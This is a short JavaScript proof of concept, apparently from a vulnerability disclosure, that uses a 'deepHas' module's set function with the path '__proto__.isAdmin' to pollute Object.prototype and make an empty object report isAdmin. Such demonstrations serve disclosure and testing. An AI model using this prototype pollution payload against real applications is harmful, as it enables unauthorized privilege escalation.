var dh = require("./deepHas");
var obj = {};
console.log(obj.isAdmin);
dh.set(obj,'__proto__.isAdmin','true');
console.log(obj.isAdmin);